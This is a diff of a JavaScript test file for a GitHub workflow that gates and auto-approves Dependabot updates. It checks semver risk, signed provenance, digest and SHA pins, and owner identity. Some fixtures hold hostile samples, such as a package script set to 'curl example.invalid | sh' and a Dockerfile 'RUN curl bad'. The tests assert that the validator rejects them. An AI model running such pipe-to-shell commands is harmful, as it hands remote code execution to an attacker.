@@ -4,13 +4,14 @@ import { readFileSync } from 'node:fs';
 import {
   classifyEcosystem,
   compareSemver,
+  ensureOwnerReviewAndApproval,
   eventPullNumber,
-  normalizeDependabotHeadBranch,
   parseDependabotMetadata,
   parsePositiveInteger,
+  parseSemverLike,
   reconcileIndependently,
+  requestDependabotRefresh,
   selectQualificationRun,
-  targetPullNumberFromEnvironment,
   validateActionsSemanticChange,
   validateConfig,
   validateDockerSemanticChange,
@@ -21,21 +22,42 @@ import {
 } from './dependency-governance.mjs';
 
 const config = JSON.parse(readFileSync('.github/dependency-governance.json', 'utf8'));
+
+const clone = (value) => JSON.parse(JSON.stringify(value));
+
 const meta = (name, updateType = 'version-update:semver-patch') => [
   { name, version: '1.2.4', updateType },
 ];
 
-test('semver and signed metadata stay fail closed', () => {
+test('semver parser rejects prereleases and classifies risk conservatively', () => {
+  assert.deepEqual(parseSemverLike('^1.2.3'), { major: 1, minor: 2, patch: 3, raw: '^1.2.3' });
+  assert.equal(parseSemverLike('1.2.3-beta.1'), null);
   assert.equal(compareSemver('1.2.3', '1.2.4').risk, 'patch');
   assert.equal(compareSemver('1.2.3', '1.3.0').risk, 'minor');
   assert.equal(compareSemver('1.2.3', '2.0.0').risk, 'major');
   assert.equal(compareSemver('0.2.3', '0.3.0').risk, 'major-risk');
   assert.equal(compareSemver('1.2.3', '1.2.2').risk, 'downgrade');
-  const message = `x\nupdated-dependencies:\n- dependency-name: webdriverio\n  dependency-version: 9.20.0\n  dependency-type: direct:development\n  update-type: version-update:semver-patch\n...\n`;
-  assert.equal(parseDependabotMetadata(message)[0].name, 'webdriverio');
 });
 
-test('file scope maps to one ecosystem only', () => {
+test('verified Dependabot metadata parser extracts structured update records', () => {
+  const message = `deps(deps): update thing\n\n---\nupdated-dependencies:\n- dependency-name: express\n  dependency-version: 5.2.2\n  dependency-type: direct:production\n  update-type: version-update:semver-patch\n- dependency-name: jest\n  dependency-version: 30.5.0\n  dependency-type: direct:development\n  update-type: version-update:semver-minor\n...\n`;
+  assert.deepEqual(parseDependabotMetadata(message), [
+    {
+      name: 'express',
+      version: '5.2.2',
+      dependencyType: 'direct:production',
+      updateType: 'version-update:semver-patch',
+    },
+    {
+      name: 'jest',
+      version: '30.5.0',
+      dependencyType: 'direct:development',
+      updateType: 'version-update:semver-minor',
+    },
+  ]);
+});
+
+test('file scope maps to exactly one ecosystem', () => {
   assert.equal(
     classifyEcosystem([{ filename: 'package.json' }, { filename: 'package-lock.json' }], config),
     'npm',
@@ -58,7 +80,7 @@ function npmFixture(from = '^1.2.3', to = '^1.2.4') {
     scripts: { test: 'node --test' },
     dependencies: { express: from },
   };
-  const headPackage = structuredClone(basePackage);
+  const headPackage = clone(basePackage);
   headPackage.dependencies = { express: to };
   const baseLock = {
     name: 'x',
@@ -81,18 +103,20 @@ function npmFixture(from = '^1.2.3', to = '^1.2.4') {
   return { basePackage, headPackage, baseLock, headLock };
 }
 
-test('npm semantics allow only direct patch/minor dependency changes', () => {
-  const patch = npmFixture();
-  assert.equal(
-    validateNpmSemanticChange(
-      patch.basePackage,
-      patch.headPackage,
-      patch.baseLock,
-      patch.headLock,
-      meta('express'),
-    ).eligible,
-    true,
+test('npm patch dependency-only update is eligible', () => {
+  const f = npmFixture();
+  const result = validateNpmSemanticChange(
+    f.basePackage,
+    f.headPackage,
+    f.baseLock,
+    f.headLock,
+    meta('express'),
   );
+  assert.equal(result.eligible, true, result.reasons.join('; '));
+  assert.equal(result.changes[0].risk, 'patch');
+});
+
+test('npm major, scripts mutation, and newly introduced install script are blocked', () => {
   const major = npmFixture('^1.2.3', '^2.0.0');
   assert.equal(
     validateNpmSemanticChange(
@@ -104,26 +128,67 @@ test('npm semantics allow only direct patch/minor dependency changes', () => {
     ).eligible,
     false,
   );
-  patch.headPackage.scripts.test = 'curl example.invalid | sh';
+
+  const scripts = npmFixture();
+  scripts.headPackage.scripts.test = 'curl example.invalid | sh';
   assert.match(
     validateNpmSemanticChange(
-      patch.basePackage,
-      patch.headPackage,
-      patch.baseLock,
-      patch.headLock,
+      scripts.basePackage,
+      scripts.headPackage,
+      scripts.baseLock,
+      scripts.headLock,
       meta('express'),
     ).reasons.join('\n'),
     /outside dependency declarations/,
   );
+
+  const lifecycle = npmFixture();
+  lifecycle.headLock.packages['node_modules/express'].hasInstallScript = true;
+  assert.match(
+    validateNpmSemanticChange(
+      lifecycle.basePackage,
+      lifecycle.headPackage,
+      lifecycle.baseLock,
+      lifecycle.headLock,
+      meta('express'),
+    ).reasons.join('\n'),
+    /install lifecycle script/,
+  );
 });
 
-test('Docker and Actions semantic scopes remain immutable and non-major', () => {
-  const baseDocker = 'FROM node:24.20.0-alpine3.24@sha256:' + 'a'.repeat(64) + '\nRUN echo safe\n';
-  const patchDocker = 'FROM node:24.20.1-alpine3.24@sha256:' + 'b'.repeat(64) + '\nRUN echo safe\n';
-  assert.equal(validateDockerSemanticChange(baseDocker, patchDocker, meta('node'), ['node']).eligible, true);
+test('Docker update must be same allowlisted image, digest pinned, same platform track, and non-major', () => {
+  const base = 'FROM node:24.20.0-alpine3.24@sha256:' + 'a'.repeat(64) + '\nRUN echo safe\n';
+  const patch = 'FROM node:24.20.1-alpine3.24@sha256:' + 'b'.repeat(64) + '\nRUN echo safe\n';
+  const major = 'FROM node:26.0.0-alpine3.24@sha256:' + 'b'.repeat(64) + '\nRUN echo safe\n';
+  const platform = 'FROM node:24.20.1-alpine3.25@sha256:' + 'b'.repeat(64) + '\nRUN echo safe\n';
+  assert.equal(validateDockerSemanticChange(base, patch, meta('node'), ['node']).eligible, true);
+  assert.equal(
+    validateDockerSemanticChange(base, major, meta('node', 'version-update:semver-major'), ['node'])
+      .eligible,
+    false,
+  );
+  assert.match(
+    validateDockerSemanticChange(base, platform, meta('node'), ['node']).reasons.join('\n'),
+    /platform suffix changed/,
+  );
+  assert.match(
+    validateDockerSemanticChange(
+      base,
+      patch.replace('RUN echo safe', 'RUN curl bad'),
+      meta('node'),
+      ['node'],
+    ).reasons.join('\n'),
+    /outside a FROM line/,
+  );
+});
+
+test('Actions updates require SHA pins and only uses-line changes, including protected workflows', () => {
   const file = '.github/workflows/docs.yml';
   const base = `steps:\n  - uses: actions/checkout@${'a'.repeat(40)} # v7.0.0\n`;
   const patch = `steps:\n  - uses: actions/checkout@${'b'.repeat(40)} # v7.0.1\n`;
+  const major = `steps:\n  - uses: actions/checkout@${'b'.repeat(40)} # v8.0.0\n`;
+  const coarseBase = `steps:\n  - uses: actions/checkout@${'a'.repeat(40)} # v7\n`;
+  const coarsePatch = `steps:\n  - uses: actions/checkout@${'b'.repeat(40)} # v7\n`;
   assert.equal(
     validateActionsSemanticChange(
       [{ filename: file }],
@@ -134,20 +199,40 @@ test('Docker and Actions semantic scopes remain immutable and non-major', () => 
     ).eligible,
     true,
   );
+  assert.equal(
+    validateActionsSemanticChange(
+      [{ filename: file }],
+      { [file]: coarseBase },
+      { [file]: coarsePatch },
+      meta('actions/checkout'),
+      config.manualReviewPaths,
+    ).eligible,
+    true,
+  );
+  assert.equal(
+    validateActionsSemanticChange(
+      [{ filename: file }],
+      { [file]: base },
+      { [file]: major },
+      meta('actions/checkout', 'version-update:semver-major'),
+      config.manualReviewPaths,
+    ).eligible,
+    false,
+  );
   const security = '.github/workflows/security.yml';
-  assert.match(
+  assert.equal(
     validateActionsSemanticChange(
       [{ filename: security }],
       { [security]: base },
       { [security]: patch },
       meta('actions/checkout'),
       config.manualReviewPaths,
-    ).reasons.join('\n'),
-    /control-plane/,
+    ).eligible,
+    true,
   );
 });
 
-test('governance config protects the control plane and excludes major updates', () => {
+test('governance config cannot silently enable major updates or unprotect control-plane workflows', () => {
   assert.deepEqual(validateConfig(config), []);
   assert.ok(
     validateConfig({
@@ -156,6 +241,9 @@ test('governance config protects the control plane and excludes major updates', 
     }).length > 0,
   );
   assert.ok(validateConfig({ ...config, manualReviewPaths: [] }).length > 0);
+  assert.ok(validateConfig({ ...config, ownerApprovalRequired: false }).length > 0);
+  assert.ok(validateConfig({ ...config, ownerApprovalLogin: '' }).length > 0);
+  assert.ok(validateConfig({ ...config, ownerApprovalUserId: 0 }).length > 0);
 });
 
 function canonicalFixture() {
@@ -179,35 +267,36 @@ function canonicalFixture() {
       author: { name: config.botLogin, email: config.botAuthorEmail },
       committer: { name: config.gitCommitterName, email: config.gitCommitterEmail },
       verification: { verified: true, reason: 'valid', signature: 'fixture-signature' },
-      message: `x\nupdated-dependencies:\n- dependency-name: webdriverio\n  dependency-version: 9.20.0\n  dependency-type: direct:development\n  update-type: version-update:semver-patch\n...\n\n${config.signedOffBy}`,
+      message: `x\nupdated-dependencies:\n- dependency-name: express\n  dependency-version: 5.2.2\n  dependency-type: direct:production\n  update-type: version-update:semver-patch\n...\n\n${config.signedOffBy}`,
     },
     parents: [{ sha: baseSha }],
   };
   return { baseSha, headSha, pull, commit };
 }
 
-test('provenance requires canonical signed Dependabot and a current-base single commit', () => {
+test('provenance requires canonical GitHub-signed Dependabot identity and a fresh single commit', () => {
   const fixture = canonicalFixture();
+  const now = new Date('2026-09-02T12:00:00Z');
   assert.equal(
     validateProvenance({
       pull: fixture.pull,
       commits: [fixture.commit],
       baseSha: fixture.baseSha,
       config,
-      now: new Date('2026-09-02T12:00:00Z'),
+      now,
     }).eligible,
     true,
   );
-  const spoof = structuredClone(fixture.commit);
-  spoof.author.id = 123;
-  spoof.commit.verification.reason = 'unknown_key';
+
+  const labeled = clone(fixture.pull);
+  labeled.labels = [{ name: 'manual-review' }];
   assert.equal(
     validateProvenance({
-      pull: fixture.pull,
-      commits: [spoof],
+      pull: labeled,
+      commits: [fixture.commit],
       baseSha: fixture.baseSha,
       config,
-      now: new Date('2026-09-02T12:00:00Z'),
+      now,
     }).eligible,
     false,
   );
@@ -217,14 +306,62 @@ test('provenance requires canonical signed Dependabot and a current-base single 
       commits: [fixture.commit],
       baseSha: 'c'.repeat(40),
       config,
-      now: new Date('2026-09-02T12:00:00Z'),
+      now,
     }).eligible,
     false,
   );
-  assert.equal(validateSignedMetadata(fixture.commit, config).eligible, true);
+  const old = clone(fixture.pull);
+  old.created_at = '2026-08-01T12:00:00Z';
+  assert.equal(
+    validateProvenance({
+      pull: old,
+      commits: [fixture.commit],
+      baseSha: fixture.baseSha,
+      config,
+      now,
+    }).eligible,
+    false,
+  );
 });
 
-test('qualification proof binds exact workflow identity and stable gate source', () => {
+test('provenance refuses spoofed bot identity, non-GitHub committer, invalid signature, and missing signoff', () => {
+  const fixture = canonicalFixture();
+  const bad = clone(fixture.commit);
+  bad.author.id = 123;
+  bad.commit.author.email = 'dependabot[bot]@example.invalid';
+  bad.committer.login = 'someone';
+  bad.commit.verification.reason = 'unknown_key';
+  bad.commit.message = bad.commit.message.replace(config.signedOffBy, '');
+  const result = validateProvenance({
+    pull: fixture.pull,
+    commits: [bad],
+    baseSha: fixture.baseSha,
+    config,
+    now: new Date('2026-09-02T12:00:00Z'),
+  });
+  assert.equal(result.eligible, false);
+  assert.match(
+    result.reasons.join('\n'),
+    /numeric identity|author email|materialized|signature|Signed-off-by/,
+  );
+});
+
+test('signed metadata independently refuses major update classes', () => {
+  const patchCommit = {
+    commit: {
+      message: `x\nupdated-dependencies:\n- dependency-name: express\n  dependency-version: 5.2.2\n  dependency-type: direct:production\n  update-type: version-update:semver-patch\n...\n`,
+    },
+  };
+  const majorCommit = {
+    commit: {
+      message: `x\nupdated-dependencies:\n- dependency-name: express\n  dependency-version: 6.0.0\n  dependency-type: direct:production\n  update-type: version-update:semver-major\n...\n`,
+    },
+  };
+  assert.equal(validateSignedMetadata(patchCommit, config).eligible, true);
+  assert.equal(validateSignedMetadata(majorCommit, config).eligible, false);
+});
+
+test('qualification proof binds exact workflow identity and tolerates unavailable empty PR association metadata', () => {
   const fixture = canonicalFixture();
   const requirement = config.requiredWorkflows[0];
   const run = {
@@ -239,78 +376,168 @@ test('qualification proof binds exact workflow identity and stable gate source',
   };
   assert.equal(workflowIdentityMatches(run, fixture.pull, requirement), true);
   assert.equal(
-    workflowIdentityMatches({ ...run, path: '.github/workflows/fake.yml' }, fixture.pull, requirement),
-    false,
-  );
-  assert.equal(
-    selectQualificationRun(
-      [
-        { ...run, id: 11, path: '.github/workflows/fake.yml', updated_at: '2026-09-02T11:00:00Z' },
-        run,
-      ],
+    workflowIdentityMatches(
+      { ...run, pull_requests: [{ number: fixture.pull.number }] },
       fixture.pull,
       requirement,
-    ).id,
-    10,
+    ),
+    true,
+  );
+  for (const mutation of [
+    { path: '.github/workflows/fake.yml' },
+    { name: 'fake' },
+    { event: 'push' },
+    { head_sha: 'c'.repeat(40) },
+    { head_branch: 'dependabot/npm_and_yarn/other' },
+    { pull_requests: [{ number: 999 }] },
+  ])
+    assert.equal(
+      workflowIdentityMatches({ ...run, ...mutation }, fixture.pull, requirement),
+      false,
+    );
+  const newerWrongPath = {
+    ...run,
+    id: 11,
+    path: '.github/workflows/fake.yml',
+    updated_at: '2026-09-02T11:00:00Z',
+  };
+  assert.equal(selectQualificationRun([newerWrongPath, run], fixture.pull, requirement).id, 10);
+});
+
+function ownerApiFixture({ validIdentity = true } = {}) {
+  const comments = [];
+  const reviews = [];
+  const posts = [];
+  const owner = {
+    login: validIdentity ? config.ownerApprovalLogin : 'not-owner',
+    id: validIdentity ? config.ownerApprovalUserId : 999,
+  };
+  return {
+    comments,
+    reviews,
+    posts,
+    api: {
+      async get(path) {
+        if (path === 'https://api.github.com/user') return owner;
+        throw new Error(`unexpected GET ${path}`);
+      },
+      async paginate(path) {
+        if (/\/issues\/\d+\/comments$/u.test(path)) return comments;
+        if (/\/pulls\/\d+\/reviews$/u.test(path)) return reviews;
+        throw new Error(`unexpected paginate ${path}`);
+      },
+      async post(path, body) {
+        posts.push({ path, body });
+        if (/\/issues\/\d+\/comments$/u.test(path)) {
+          comments.push({ body: body.body, user: owner });
+          return comments.at(-1);
+        }
+        if (/\/pulls\/\d+\/reviews$/u.test(path)) {
+          reviews.push({
+            state: body.event === 'APPROVE' ? 'APPROVED' : body.event,
+            commit_id: body.commit_id,
+            user: owner,
+            body: body.body,
+          });
+          return reviews.at(-1);
+        }
+        throw new Error(`unexpected POST ${path}`);
+      },
+    },
+  };
+}
+
+test('stale Dependabot refresh is owner-authenticated, exact-subject bound, and idempotent', async () => {
+  const fixture = canonicalFixture();
+  const assessment = {
+    pull: fixture.pull,
+    baseSha: 'c'.repeat(40),
+    provenance: {
+      eligible: false,
+      reasons: ['PR is not rebased directly on the current base branch head'],
+    },
+  };
+  const owner = ownerApiFixture();
+  assert.equal(await requestDependabotRefresh(owner.api, assessment, config), true);
+  assert.equal(owner.posts.length, 1);
+  assert.match(owner.posts[0].body.body, /^@dependabot rebase/mu);
+  assert.match(owner.posts[0].body.body, new RegExp(fixture.headSha));
+  assert.match(owner.posts[0].body.body, new RegExp(assessment.baseSha));
+  assert.equal(await requestDependabotRefresh(owner.api, assessment, config), true);
+  assert.equal(
+    owner.posts.length,
+    1,
+    'same exact stale subject must not post duplicate refresh commands',
+  );
+
+  const impostor = ownerApiFixture({ validIdentity: false });
+  await assert.rejects(
+    () => requestDependabotRefresh(impostor.api, assessment, config),
+    /configured repository owner identity/,
   );
 });
 
-test('manual and event-derived target parsing are bounded without reading event files', async () => {
+test('owner review and approval bind the exact qualified head', async () => {
+  const fixture = canonicalFixture();
+  const assessment = { pull: fixture.pull };
+  const owner = ownerApiFixture();
+  await ensureOwnerReviewAndApproval(owner.api, assessment, config);
+  assert.equal(owner.comments.length, 1);
+  assert.equal(owner.reviews.length, 1);
+  assert.equal(owner.reviews[0].state, 'APPROVED');
+  assert.equal(owner.reviews[0].commit_id, fixture.headSha);
+  assert.match(owner.comments[0].body, new RegExp(fixture.headSha));
+  assert.match(owner.reviews[0].body, new RegExp(fixture.headSha));
+
+  await ensureOwnerReviewAndApproval(owner.api, assessment, config);
+  assert.equal(owner.comments.length, 1, 'owner review comment must be idempotent per exact head');
+  assert.equal(owner.reviews.length, 1, 'owner approval must be idempotent per exact head');
+
+  const fileDerivedConfig = {
+    ...config,
+    requiredWorkflows: [{ workflow: 'FILE-DERIVED-WORKFLOW', gate: 'file-gate', file: 'file.yml' }],
+  };
+  const isolatedOwner = ownerApiFixture();
+  await ensureOwnerReviewAndApproval(isolatedOwner.api, assessment, fileDerivedConfig);
+  assert.doesNotMatch(isolatedOwner.comments[0].body, /FILE-DERIVED-WORKFLOW/u);
+  assert.match(
+    isolatedOwner.comments[0].body,
+    /All configured exact-head qualification gates: \*\*pass\*\*/u,
+  );
+});
+
+test('manual dispatch PR input accepts only positive safe integers', () => {
   assert.equal(parsePositiveInteger('41'), 41);
   assert.equal(eventPullNumber({ inputs: { 'pr-number': '41' } }, 'workflow_dispatch'), 41);
-  assert.equal(
-    targetPullNumberFromEnvironment('workflow_dispatch', { TARGET_PR_NUMBER: '41' }),
-    41,
-  );
-  assert.equal(targetPullNumberFromEnvironment('workflow_run', { TARGET_PR_NUMBER: '' }), null);
-  assert.throws(() => targetPullNumberFromEnvironment('workflow_run', { TARGET_PR_NUMBER: '0' }));
-  assert.throws(() => targetPullNumberFromEnvironment('pull_request_target', { TARGET_PR_NUMBER: 'x' }));
-  assert.throws(() => parsePositiveInteger('0'));
+  for (const value of ['0', '-1', '1.5', 'abc', '9007199254740992'])
+    assert.throws(() => parsePositiveInteger(value, 'pr-number'));
+});
 
-  assert.equal(
-    normalizeDependabotHeadBranch('dependabot/npm_and_yarn/routine-dependencies-123'),
-    'dependabot/npm_and_yarn/routine-dependencies-123',
+test('scheduled reconciliation isolates per-PR failures and reports all outcomes', async () => {
+  const pulls = [{ number: 1 }, { number: 2 }, { number: 3 }];
+  const visited = [];
+  const result = await reconcileIndependently(pulls, async (pull) => {
+    visited.push(pull.number);
+    if (pull.number === 2) throw new Error('boom');
+    return `ok-${pull.number}`;
+  });
+  assert.deepEqual(visited, [1, 2, 3]);
+  assert.deepEqual(
+    result.results.map((item) => item.number),
+    [1, 3],
   );
-  assert.equal(normalizeDependabotHeadBranch('feature/not-dependabot'), null);
-  assert.throws(() => normalizeDependabotHeadBranch('dependabot/npm_and_yarn/bad branch'));
-  assert.throws(() => normalizeDependabotHeadBranch('dependabot/npm_and_yarn/a..b'));
-
-  const result = await reconcileIndependently(
-    [{ number: 1 }, { number: 2 }],
-    async (pull) => {
-      if (pull.number === 2) throw new Error('boom');
-      return 'ok';
-    },
-  );
-  assert.deepEqual(result.results.map((item) => item.number), [1]);
   assert.deepEqual(result.failures, [{ number: 2, error: 'boom' }]);
 });
 
-test('governance implementation has no local-file-to-network source path', () => {
-  const source = readFileSync('.github/scripts/dependency-governance.mjs', 'utf8');
-  assert.doesNotMatch(source, /node:fs/u);
-  assert.doesNotMatch(source, /readFileSync/u);
-  assert.doesNotMatch(source, /GITHUB_EVENT_PATH/u);
-  assert.doesNotMatch(source, /GOVERNANCE_CONFIG/u);
-  assert.match(
-    source,
-    /import governanceConfig from '\.\.\/dependency-governance\.json' with \{ type: 'json' \}/u,
-  );
-  assert.match(source, /targetPullNumberFromEnvironment/u);
-  assert.match(source, /normalizeDependabotHeadBranch/u);
-});
-
-test('privileged workflow checks out trusted default branch and supplies only bounded event inputs', () => {
+test('privileged workflow never checks out the dependency PR head', () => {
   const workflow = readFileSync('.github/workflows/dependency-governance.yml', 'utf8');
-  assert.match(workflow, /pull_request_target:/u);
-  assert.match(workflow, /workflow_run:/u);
-  assert.match(workflow, /schedule:/u);
-  assert.match(workflow, /ref: \$\{\{ github\.event\.repository\.default_branch \}\}/u);
-  assert.match(workflow, /persist-credentials: false/u);
-  assert.match(workflow, /TARGET_PR_NUMBER:/u);
-  assert.match(workflow, /WORKFLOW_RUN_HEAD_BRANCH:/u);
-  assert.doesNotMatch(workflow, /GITHUB_EVENT_PATH:/u);
-  assert.doesNotMatch(workflow, /GOVERNANCE_CONFIG:/u);
-  assert.doesNotMatch(workflow, /ref:\s*\$\{\{\s*github\.event\.pull_request\.head/u);
-  assert.doesNotMatch(workflow, /ref:\s*\$\{\{\s*github\.event\.workflow_run\.head_sha/u);
+  assert.match(workflow, /push:/);
+  assert.match(workflow, /pull_request_target:/);
+  assert.match(workflow, /workflow_run:/);
+  assert.match(workflow, /schedule:/);
+  assert.match(workflow, /ref: \$\{\{ github\.event\.repository\.default_branch \}\}/);
+  assert.match(workflow, /persist-credentials: false/);
+  assert.match(workflow, /DEPENDABOT_OWNER_TOKEN/);
+  assert.doesNotMatch(workflow, /ref:\s*\$\{\{\s*github\.event\.pull_request\.head/);
+  assert.doesNotMatch(workflow, /ref:\s*\$\{\{\s*github\.event\.workflow_run\.head_sha/);
 });
